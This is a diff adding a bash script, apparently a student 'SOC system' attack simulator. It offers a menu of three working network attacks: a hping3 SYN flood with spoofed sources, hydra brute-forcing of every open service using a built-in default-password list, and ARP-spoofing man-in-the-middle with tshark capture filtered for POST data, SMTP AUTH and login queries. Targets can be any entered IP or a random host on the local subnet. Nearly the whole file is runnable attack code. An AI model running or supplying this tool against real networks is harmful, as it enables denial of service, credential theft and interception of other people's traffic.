@@ -1,0 +1,678 @@
+#!/bin/bash
+
+# Store the current directory in a variable
+current_dir=$(pwd)
+
+# Declare global variables
+machine_ip=""
+subnet=""
+network=""
+
+# Set up trap to clean up background processes when Ctrl+C is pressed
+trap 'kill $(jobs -p); exit' SIGINT
+
+# Check if the "logs" directory exists and delete if it does already exit.
+function rm_logs_if_exist() {
+	# Check if the "logs" directory exists
+	if [ -d "logs" ]; then
+		fast_type_text "$(format_bold "$(color_green "[#] Removing the logs directory for more use of the script...")")"
+		sudo rm -r "logs"
+		sleep 1
+	fi
+}
+
+
+# Check if all the services are installed and if not, download them.
+function check_and_install_service() {
+	local program="$1"
+	
+    # Check package manager
+    if command -v apt-get &> /dev/null; then
+        PACKAGE_MANAGER="apt-get"
+    elif command -v dnf &> /dev/null; then
+        PACKAGE_MANAGER="dnf"
+    elif command -v pacman &> /dev/null; then
+        PACKAGE_MANAGER="pacman"
+    else
+        type_text "$(format_bold "$(color_red "[!] Unsupported package manager. Exiting...")")"
+        exit 1
+    fi
+
+    # Install services
+    # hping3 masscan nmap hydra
+    for x in "$program" ; do
+        if [ -z "$(which $x)" ]; then
+            type_text "$(format_bold "$(color_red "[!] $x is not installed, installing..")")"
+            sleep 1
+            echo "$(format_bold "$(color_blue "[#] All installation logs are saved in logs/program_logs folder")")"
+            LOG_FILE="logs/$x.program_log.txt"  # Create log file for each package inside the log folder
+            sudo "$PACKAGE_MANAGER" install -y $x > "$LOG_FILE" 2>&1  # Redirect both stdout and stderr to the log file
+            fast_type_text "$(format_bold "$(color_green "[#] $x is installed, YAY :D")")"
+        else
+            fast_type_text "$(format_bold "$(color_green "[#] $x is installed, YAY :D")")"
+        fi
+        sleep 0.5
+    done
+}
+
+
+# Function include all the colors for later use
+color(){
+    printf '\e[48;5;%dm\e[38;5;%dm%s\e[0m' "$1" "$2" "$3"
+    printf '\e[0m \n'
+}
+
+
+color_functions() {
+  color() {
+    echo -e "\e[48;5;${1}m\e[38;5;${2}m$3\e[0m"
+  }
+
+  color_red() {
+    color 0 196 "$1"
+  }
+
+  color_blue() {
+    color 0 21 "$1"
+  }
+
+  color_green() {
+    color 0 40 "$1"
+  }
+
+  color_gold() {
+    color 0 220 "$1"
+  }
+
+  color_purple() {
+    color 0 93 "$1"
+  }
+
+  color_dark_green() {
+    color 0 22 "$1"
+  }
+
+  color_dark_blue() {
+    color 0 18 "$1"
+  }
+
+  color_dark_red() {
+    color 0 88 "$1"
+  }
+
+  color_dark_purple() {
+    color 0 55 "$1"
+  }
+
+  color_orange() {
+    color 0 202 "$1"
+  }
+
+  color_brown() {
+    color 0 130 "$1"
+  }
+
+  color_black() {
+    color 15 0 "$1"
+  }
+
+  color_white() {
+    color 0 15 "$1"
+  }
+
+  color_yellow() {
+    color 0 226 "$1"
+  }
+
+  color_aqua() {
+    color 0 51 "$1"
+  }
+
+  color_cyan() {
+    color 0 45 "$1"
+  }
+
+  color_pink() {
+    color 0 198 "$1"
+  }
+
+  color_magenta() {
+    color 0 165 "$1"
+  }
+
+  color_gray() {
+    color 0 246 "$1"
+  }
+
+  color_dark_gray() {
+    color 0 238 "$1"
+  }
+
+  color_light_blue() {
+    color 0 111 "$1"
+  }
+
+  color_lime() {
+    color 0 154 "$1"
+  }
+
+  color_light_gray() {
+    color 0 250 "$1"
+  }
+
+  format_bold() {
+    echo -e "\e[1m$1\e[0m"
+  }
+}
+color_functions
+
+
+# Function include all the formats for later use
+function format_functions() {
+	format_bold() {
+		echo -e "\e[1m$1\e[0m"
+	}
+	format_tilt() {
+		echo -e "\e[3m$1\e[0m"
+	}
+	format_underline() {
+		echo -e "\e[4m$1\e[0m"
+	}
+	format_blink() {
+		echo -e "\e[5m$1\e[0m"
+	}
+	format_inverted() {
+		echo -e "\e[7m$1\e[0m"
+	}
+}
+format_functions
+
+
+# Function to type text
+function fast_type_text() {
+    local text="$1"
+    local delay=0.02  # Adjust this value to control typing speed (in seconds)
+    
+    for ((i = 0; i < ${#text}; i++)); do
+        echo -n "${text:i:1}"
+        sleep "$delay"
+    done
+    echo  # Print a newline at the end
+}
+
+
+# Function to type text
+function type_text() {
+    local text="$1"
+    local delay=0.03  # Adjust this value to control typing speed (in seconds)
+    
+    for ((i = 0; i < ${#text}; i++)); do
+        echo -n "${text:i:1}"
+        sleep "$delay"
+    done
+    echo  # Print a newline at the end
+}
+
+
+# Function include progress bar for later use
+function progress_bar() {
+	
+  local duration=$1
+  local bar_length=20
+
+  for ((i=0; i<=duration; i++)); do
+    local filled=$(printf "%-$((i*bar_length/duration))s" | tr ' ' '=')
+    local remaining=$(printf "%-$(((duration-i)*bar_length/duration))s" | tr ' ' '-')
+    printf "\r[%s%s] %d%%" "$filled" "$remaining" "$((i * 100 / duration))"
+    sleep 1
+  done
+  printf "\n"
+}
+
+# Displays the header
+function display_header() {
+    # ANSI color codes
+    RED='\033[1;31m'
+    GREEN='\033[1;32m'
+    YELLOW='\033[1;33m'
+    RESET='\033[0m'  # Reset to default color
+
+    # Figlet font
+    FIGLET_FONT="slant"
+
+    # Clear the screen
+    clear
+
+    # Display the header
+    echo -e "${RED}"
+    figlet -f ${FIGLET_FONT} "SOC system"
+    echo -e "${RESET}"
+    echo -e "${GREEN}Mitsi${RESET}"
+    echo -e "${YELLOW}-----------------------------------------${RESET}"
+}
+
+
+# Function to set variables
+function initialize_variables() {
+    # Get the machine's IP address dynamically
+    machine_ip=$(hostname -I | awk '{print $1}')
+
+    # Store the subnet Mask as a variable
+    subnet=$(ipcalc -n "$machine_ip" | grep -oP 'Network:\s+\K[\d./]+' | awk -F '/' '{print $2}')
+
+    # Store the network as a value
+    network=$(sudo nmap -sn "$machine_ip"/"$subnet" | grep -oP '(\d{1,3}\.){3}\d{1,3}' | awk '{printf "%s, ", $0}' | sed 's/, $//')
+}
+
+
+# Function to perform DDoS attack
+function ddos_attack() {	
+	# Make directory for DDoS logs
+	mkdir logs/DDoS
+	
+    selected_attack=$(type_text "$(format_bold "$(color_white "DDoS")")")
+    type_text "$(format_bold "$(color_blue "Selected attack... "$selected_attack"")")"
+    sleep 0.5
+    type_text "$(format_bold "$(color_white "[!] Loading attack...")")"
+    
+    # Downloading necessary tools for DDoS: hping3 masscan nmap
+    check_and_install_service hping3
+    check_and_install_service masscan
+    check_and_install_service nmap
+    
+    sleep 0.5
+    progress_bar 1
+        
+    # Prompt the user to enter the target IP address
+    type_text "$(format_bold "$(color_cyan "Enter the target IP address:") ")"
+    read -r target_ip
+    
+    # Validate the entered IP address format
+	if [[ ! ($target_ip =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}(/[0-9]+)?$) || $target_ip == 'random' || $target_ip == 'Random' || $target_ip == 'r' || $target_ip == 'R' ]]; then
+		if [[ $target_ip == 'random' || $target_ip == 'Random' || $target_ip == 'r' || $target_ip == 'R' ]]; then
+			target_ip=$(sudo nmap -sn "$machine_ip"/"$subnet" | grep -oP '(\d{1,3}\.){3}\d{1,3}' | awk '{printf "%s\n", $0}' | shuf | head -n 1 &)
+		else
+			error_message="Error: Invalid network format. Please use a valid IP address (e.g., 192.168.1.1) or CIDR notation (e.g., 192.168.1.0/24)."
+			type_text "$(format_bold "$(color_red "$error_message")")"
+			exit 1
+		fi
+	fi
+	
+    # Print the entered IP address for verification
+    confirmation_message="Network Chosen: $target_ip"
+    type_text "$(format_bold "$(color_green "$confirmation_message")")"
+    
+    # Scan for open ports on the target IP
+    local open_ports_from_nmap="$(nmap -p- --open "$target_ip" | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')"
+    
+    type_text "$(format_bold "$(color_blue "Open ports found on target IP:")") $open_ports_from_nmap"
+    
+    # Prompt the user to select ports for the attack
+    type_text "$(format_bold "$(color_cyan "Enter the port(s) you want to attack (comma-separated):") ")"
+    read -r target_ports_input
+    
+    # Prompt the user to enter the duration of the attack
+    type_text "$(format_bold "$(color_cyan "Enter the duration of the attack (in seconds):") ")"
+    read -r duration
+    
+	# Display attack details
+	echo
+	type_text "$(format_bold "$(color_cyan "Timestamp:")") $(date)"
+    type_text "$(format_bold "$(color_blue "Starting DDoS attack on:")") $target_ip"
+    type_text "$(format_bold "$(color_blue "Duration:")") $duration seconds"
+    if [[ $target_ports_input == 'all' || $target_ports_input == 'All' || $target_ports_input == 'ALL' ]]; then
+		type_text "$(format_bold "$(color_cyan "Target Protocol(s):")") $open_ports_from_nmap"
+    else
+		type_text "$(format_bold "$(color_cyan "Target Port(s):")") $target_ports_input"
+    fi
+    
+    # Save attack type, time of attack, and IP of victim
+    echo "$(format_bold "$(color_cyan "Timestamp:")") $(date)" >> logs/DDoS/DDoS_"$target_ip".txt
+    echo "$(format_bold "$(color_cyan "Starting brute force attack on:")") $target_ip" >> logs/DDoS/DDoS_"$target_ip".txt
+    echo "$(format_bold "$(color_cyan "Duration:")") $duration seconds" >> logs/DDoS/DDoS_"$target_ip".txt
+    if [[ $target_ports_input == 'all' || $target_ports_input == 'All' || $target_ports_input == 'ALL' ]]; then
+		echo "$(format_bold "$(color_cyan "Target Ports(s):")") $open_ports_from_nmap" >> logs/DDoS/DDoS_"$target_ip".txt
+    else
+		echo "$(format_bold "$(color_cyan "Target Ports(s):")") $target_ports_input" >> logs/DDoS/DDoS_"$target_ip".txt
+    fi
+    
+    
+		# Use Hping3 to send TCP SYN packets to the target IP and port(s)
+	if [[ $target_ports_input != 'all' && $target_ports_input != 'All' && $target_ports_input != 'ALL' ]]; then
+		# Loop through each port specified by the user
+		for port in $(echo "$target_ports_input" | tr ',' ' '); do
+			sudo hping3 --flood --rand-source -S -p "$port" "$target_ip" &>> logs/DDoS/hping3.txt &
+		done
+	else
+		# Attack all open ports found during the Nmap scan
+		for port in $(echo "$open_ports_from_nmap" | tr ',' ' '); do
+			sudo hping3 --flood --rand-source -S -p "$port" "$target_ip" &>> logs/DDoS/hping3.txt &
+		done
+	fi
+
+
+    # Check if the user wants to use nmap and masscan
+    type_text "$(format_bold "$(color_cyan "Do you want to use nmap and masscan for additional DDoS capabilities? (yes/no):") ")"
+    read -r use_nmap_masscan
+
+    if [[ "$use_nmap_masscan" == "yes" ]]; then
+        # Run nmap and masscan in the background
+        sudo nmap -Pn -p- --min-rate 5000 --max-retries 0 --open "$target_ip" -oN logs/DDoS/nmap.txt &>> logs/DDoS/nmap.txt &
+        sudo masscan -p1-65535,U:1-65535 "$target_ip" --rate 10000 -oL logs/DDoS/masscan.txt &>> logs/DDoS/masscan.txt &
+    fi
+
+    # Sleep for the specified duration
+    sleep "$duration"
+
+    # Stop all attack processes
+    sudo pkill hping3
+    sudo pkill nmap
+    sudo pkill masscan
+    
+    echo
+    progress_bar 3
+
+    type_text "$(format_bold "$(color_green "DDoS attack completed.")")"   
+}
+
+# Function to check hydra weak password check
+function hydra_common_password_check() {
+  local target_host="$1"
+  local target_port="$2"
+
+  echo "$(format_bold "$(color_pink "Running Hydra for common password check...")")"
+  # Predefined lists
+  common_users=("admin" "root" "user" "kali" "msfadmin")
+  common_passwords=("password" "kali" "admin" "letmein" "msfadmin" "qwerty" "123456789" "abc123" "111111" "123123" "admin123" "admin@123" "adminadmin" "admin1234" "admin@1234" "adminadmin123" "adminadmin@123" "admin12345" "admin@12345" "adminadmin12345" "adminadmin@12345" "password123" "password@123" "password1234" "password@1234" "password12345" "password@12345")
+
+  # Create temporary files for user and password lists
+  user_list_file=$(mktemp)
+  password_list_file=$(mktemp)
+
+  # Write the predefined lists to the temporary files
+  printf "%s\n" "${common_users[@]}" > "$user_list_file"
+  printf "%s\n" "${common_passwords[@]}" > "$password_list_file"
+  
+  local valid_input=false
+
+  while [ "$valid_input" == false ]; do
+    read -p "$(format_bold "$(color_pink "Do you want to use a predefined password list? (yes/no): ")")" use_predefined_list
+    
+    if [ "$use_predefined_list" == "yes" ]; then
+      # Run Hydra with the predefined_list
+      hydra -L "$user_list_file" -P "$password_list_file" "$target_port"://"$target_host" -v > logs/brute_force/$target_port.password.check.predefined_list 2>&1
+      echo "$(format_bold "[!] Results for check are saved in --> logs/$output_directory/$target_port.password.check.predefined_list")"
+      valid_input=true
+    elif [ "$use_predefined_list" == "no" ]; then
+      # Ask the user for a password list
+      read -p "Enter the path to the password list: " password_list_from_user
+
+      # Check if the file exists
+      if [ -f "$password_list_from_user" ]; then
+        # Run Hydra with the given password list
+        hydra -L "$user_list_file" -P "$password_list_from_user" "$target_port"://"$target_host" -v -t 2 > logs/brute_force/$target_port.password.check.from.user 2>&1
+        echo "$(format_bold "[!] Results for check are saved in --> logs/$output_directory/$target_port.password.check.from.user")"
+        valid_input=true
+      else
+        echo "$(format_bold "$(color_red "Error: Password list not found.")")"
+      fi
+    else
+      echo "$(format_bold "$(color_red "Invalid input. Please enter either 'yes' or 'no'.")")"
+    fi
+  done
+
+  # Remove temporary files
+  rm -f "$user_list_file" "$password_list_file"
+}
+
+
+# Function to perform Brute-Force attack
+function brute_force_attack() {
+	
+    # Make directory for Brute-Force logs
+    mkdir logs/brute_force
+    
+    selected_attack=$(type_text "$(format_bold "$(color_white "Brute-Force")")")
+    type_text "$(format_bold "$(color_purple "Selected attack... "$selected_attack"")")"
+    sleep 0.5
+    type_text "$(format_bold "$(color_white "[!] Loading attack...")")"
+    
+    # Downloading necessary tools for Brute-force: hydra nmap
+    check_and_install_service hydra
+    check_and_install_service nmap
+    
+    sleep 0.5
+    progress_bar 1
+    
+    # Prompt the user to enter the target IP address
+    type_text "$(format_bold "$(color_purple "Enter the target IP address:") ")" 
+    read -r target_ip
+    
+    # Validate the entered IP address format
+	if [[ ! ($target_ip =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}(/[0-9]+)?$) || $target_ip == 'random' || $target_ip == 'Random' || $target_ip == 'r' || $target_ip == 'R' ]]; then
+		if [[ $target_ip == 'random' || $target_ip == 'Random' || $target_ip == 'r' || $target_ip == 'R' ]]; then
+			target_ip=$(sudo nmap -sn "$machine_ip"/"$subnet" | grep -oP '(\d{1,3}\.){3}\d{1,3}' | awk '{printf "%s\n", $0}' | shuf | head -n 1 &)
+		else
+			error_message="Error: Invalid network format. Please use a valid IP address (e.g., 192.168.1.1) or CIDR notation (e.g., 192.168.1.0/24)."
+			type_text "$(format_bold "$(color_red "$error_message")")"
+			exit 1
+		fi
+	fi
+	
+    # Print the entered IP address for verification
+    confirmation_message="Network Chosen: $target_ip"
+    type_text "$(format_bold "$(color_green "$confirmation_message")")"
+    
+    # Scan for open protocols on the target IP
+    local open_protocols_from_nmap="$(nmap -p- --open --open "$target_ip" | grep ^[0-9] | awk '{print $3}' | tr '\n' ',' | sed 's/,$//')"
+    
+    # Display the open protocols found on the target IP
+    type_text "$(format_bold "$(color_purple "Open protocols found on target IP:")") $open_protocols_from_nmap"
+    
+    # Prompt the user to select protocols for the attack
+    type_text "$(format_bold "$(color_pink "Enter the protocol(s) (all is an option) you want to attack (comma-separated):") ")" 
+    read -r target_ports_input
+    
+    # Display attack details
+    type_text "$(format_bold "$(color_cyan "Timestamp:")") $(date)" 
+    type_text "$(format_bold "$(color_cyan "Starting brute force attack on:")") $target_ip"
+    if [[ $target_ports_input == 'all' || $target_ports_input == 'All' || $target_ports_input == 'ALL' ]]; then
+		type_text "$(format_bold "$(color_cyan "Target Protocol(s):")") $open_protocols_from_nmap"
+    else
+		type_text "$(format_bold "$(color_cyan "Target Protocol(s):")") $target_ports_input"
+    fi 
+    
+    # Save attack type, time of attack, and IP of victim
+    echo "$(format_bold "$(color_purple "Selected attack... Brute-Force")")" >> logs/brute_force/brute_force_"$target_ip".txt
+    echo "$(format_bold "$(color_cyan "Timestamp:")") $(date)" >> logs/brute_force/brute_force_"$target_ip".txt
+    echo "$(format_bold "$(color_cyan "Starting brute force attack on:")") $target_ip" >> logs/brute_force/brute_force_"$target_ip".txt
+    if [[ $target_ports_input == 'all' || $target_ports_input == 'All' || $target_ports_input == 'ALL' ]]; then
+		echo "$(format_bold "$(color_cyan "Target Protocol(s):")") $open_protocols_from_nmap" >> logs/brute_force/brute_force_"$target_ip".txt
+    else
+		echo "$(format_bold "$(color_cyan "Target Protocol(s):")") $target_ports_input" >> logs/brute_force/brute_force_"$target_ip".txt
+    fi
+	
+    # Get the number of open protocols and selected protocols
+	local all_num_protocols=$(echo "$open_protocols_from_nmap" | awk -F ',' '{print NF}')
+	local num_protocols=$(echo $target_ports_input | awk -F ',' '{print NF}')
+	
+    # Loop through selected protocols or all open protocols and perform brute force attack
+	if [[ $target_ports_input == 'all' || $target_ports_input == 'All' || $target_ports_input == 'ALL' ]]; then
+		for ((i=1; i<=$all_num_protocols; i++)); do 
+			single_protocol=$(echo "$open_protocols_from_nmap" | awk -v i="$i" -F ',' '{print $i}')
+			hydra_common_password_check "$target_ip" "$single_protocol"
+		done
+	else
+		for ((i=1; i<=$num_protocols; i++)); do 
+			single_protocol=$(echo "$target_ports_input"  | awk -v i="$i" -F ',' '{print $i}') 
+			hydra_common_password_check "$target_ip" "$single_protocol"
+		done
+	fi
+	progress_bar 2
+
+    type_text "$(format_bold "$(color_green "Brute-force attack completed.")")" 
+}
+
+
+# Function to perform Man-in-the-Middle (MiTM)
+function mitm_attack() {
+	 
+    # Make directory for Man-in-the-Middle (MiTM) logs
+    mkdir logs/MiTM 
+    
+    selected_attack=$(type_text "$(format_bold "$(color_white "Man-in-the-Middle (MiTM)")")")
+    type_text "$(format_bold "$(color_orange "Selected attack... "$selected_attack"")")"
+    sleep 0.5
+    type_text "$(format_bold "$(color_white "[!] Loading attack...")")"
+    sleep 0.5
+    progress_bar 1
+    
+    # Downloading necessary tools for MiTM: arpspoof tshark nmap dsniff
+    check_and_install_service dsniff
+    check_and_install_service arpspoof
+    check_and_install_service tshark
+    check_and_install_service nmap
+    
+    # Prompt the user to enter the target IP address
+    type_text "$(format_bold "$(color_orange "Enter the target IP address:") ")" 
+    read -r target_ip
+    
+    # Validate the entered IP address format
+	if [[ ! ($target_ip =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}(/[0-9]+)?$) || $target_ip == 'random' || $target_ip == 'Random' || $target_ip == 'r' || $target_ip == 'R' ]]; then
+		if [[ $target_ip == 'random' || $target_ip == 'Random' || $target_ip == 'r' || $target_ip == 'R' ]]; then
+			target_ip=$(sudo nmap -sn "$machine_ip"/"$subnet" | grep -oP '(\d{1,3}\.){3}\d{1,3}' | awk '{printf "%s\n", $0}' | shuf | head -n 1 &)
+		else
+			error_message="Error: Invalid network format. Please use a valid IP address (e.g., 192.168.1.1) or CIDR notation (e.g., 192.168.1.0/24)."
+			type_text "$(format_bold "$(color_red "$error_message")")"
+			exit 1
+		fi
+	fi
+	
+    # Print the entered IP address for verification
+    confirmation_message="Network Chosen: $target_ip"
+    type_text "$(format_bold "$(color_green "$confirmation_message")")"
+    
+    # Prompt the user to enter the duration of the attack
+    type_text "$(format_bold "$(color_orange "Enter the duration of the attack (in seconds):") ")"
+    read -r duration
+    
+    type_text ""
+    
+    # Display attack details
+    type_text "$(format_bold "$(color_cyan "Timestamp:")") $(date)" 
+    type_text "$(format_bold "$(color_cyan "Starting brute force attack on:")") $target_ip"
+    type_text "$(format_bold "$(color_cyan "Duration:")") $duration seconds"
+    
+    # Save attack type, time of attack, and IP of victim
+    echo "$(format_bold "$(color_purple "Selected attack... Brute-Force")")" >> logs/MiTM/MiTM_"$target_ip".txt
+    echo "$(format_bold "$(color_cyan "Timestamp:")") $(date)" >> logs/MiTM/MiTM_"$target_ip".txt
+    echo "$(format_bold "$(color_cyan "Starting Man-in-the-Middle (MiTM) attack on:")") $target_ip" >> logs/MiTM/MiTM_"$target_ip".txt
+    type_text "$(format_bold "$(color_cyan "Duration:")") $duration seconds" >> logs/MiTM/MiTM_"$target_ip".txt
+	
+	# Store the default gateway as a variable
+	default_gateway=$(ip route show | grep default | awk '{print $3}')
+	
+	 # Perform ARP spoofing to redirect traffic
+    sudo arpspoof -i eth0 -t "$target_ip" "$default_gateway" &>/dev/null &
+    sudo arpspoof -i eth0 -t "$default_gateway" "$target_ip" &>/dev/null &
+    
+    # Enable packet forwarding
+    sudo sysctl -w net.ipv4.ip_forward=1 &>/dev/null
+    
+    # Start capturing and analyzing traffic
+    tshark &>/dev/null -i eth0 -w logs/MiTM/MiTM_capture.pcap -t ad "host $target_ip" & 
+    
+    # Wait for a specified duration
+    progress_bar "$duration"
+    
+    
+    # Analyze captured traffic and extract sensitive information
+    tshark -r logs/MiTM/MiTM_capture.pcap -Y "http.request.method == POST" >> logs/MiTM/MiTM_capture_possible_info.txt &>/dev/null
+    tshark -r logs/MiTM/MiTM_capture.pcap -Y "tcp.port == 22 && (ssh || ssh2)" >> logs/MiTM/MiTM_capture_possible_info.txt &>/dev/null
+    tshark -rlogs/MiTM/MiTM_capture.pcap -Y "smtp.command == AUTH" >> logs/MiTM/MiTM_capture_possible_info.txt &>/dev/null
+	tshark -r logs/MiTM/MiTM_capture.pcap -Y "dns.qry.name contains \"login\" || dns.qry.name contains \"password\"" >> logs/MiTM/MiTM_capture_possible_info.txt &>/dev/null
+	sleep 2
+	
+    # Stop the ARP spoofing and packet capture
+    sudo pkill arpspoof
+    sudo pkill tshark
+    
+	
+    
+    # Add your analysis and data extraction code here
+	
+	echo
+	progress_bar 3
+	sleep 0.5
+    type_text "$(format_bold "$(color_green "MiTM attack completed.")")" 
+    type_text "$(format_bold "$(color_green "Recording of sensitive information is saved in: logs/MiTM/MiTM_capture.pcap")")" 
+}
+
+
+# Function to choose an attack option
+function choose_attack_option() {
+    local valid_choice=false
+    local choice
+    
+    
+    # Display attack choices
+	type_text "$(format_bold "$(color_green "Choose an attack type:")")"
+    type_text "$(format_bold "$(color_blue "1. DDoS attack! - Denial of Service attack that floods the target with traffic, rendering it unavailable.")")"
+    type_text "$(format_bold "$(color_purple "2. Brute-Force attack! - Methodically attempts all possible combinations of passwords or keys until the correct one is found.")")"
+	type_text "$(format_bold "$(color_orange "3. Man-in-the-Middle (MiTM) attack! - Intercepting communication between two parties without their knowledge.")")"
+	type_text "$(format_bold "$(color_yellow "0. Random Attack - Choose a random attack type.")")"
+    
+    # Display Found IPs in the network after the attack choice
+    echo
+    found_ips=$(sudo nmap -sn "$machine_ip"/"$subnet" | grep -oP '(\d{1,3}\.){3}\d{1,3}' | awk '{printf "%s, ", $0}' | sed 's/, $//')
+    colored_found_ips=$(type_text "$(format_bold "$(color_white "$found_ips")")")
+    type_text "$(format_bold "$(color_green "IP(s) found within your network: $colored_found_ips")")"
+    
+    # Loop until a valid choice is made
+    while [ "$valid_choice" = false ]; do
+        type_text "$(format_bold "$(color_green "Enter the number corresponding to the attack type: ")")"
+        read -r choice
+
+        case $choice in
+            0) valid_choice=true; random_attack ;;
+            1) valid_choice=true; ddos_attack ;;
+            2) valid_choice=true; brute_force_attack ;;
+            3) valid_choice=true; mitm_attack ;;
+            *) type_text "$(format_bold "$(color_red "Invalid choice. Please enter a valid number.")")" ;;
+        esac
+    done
+    
+}
+
+
+# Function for random attack selection
+function random_attack() {
+    local attack_number=$((RANDOM % 3 + 1))  # Randomly choose between 1 and 3
+    case $attack_number in
+        1) ddos_attack ;;
+        2) brute_force_attack ;;
+        3) mitm_attack ;;
+    esac
+}
+
+
+
+# Main function
+main() {
+    rm_logs_if_exist
+    mkdir logs &>/dev/null # Make a log folder for all the different logs
+    
+    check_and_install_service ipcalc # Install ipcalc program for variables to be stored
+    check_and_install_service nmap
+    initialize_variables # Save the variables needed for the script
+    display_header # Displays header
+
+    # Record the start time
+    start_time=$(date +%Y-%m-%d\ %H:%M:%S) # Record the start time
+    
+    choose_attack_option
+	
+}
+
+# Call the main function
+main
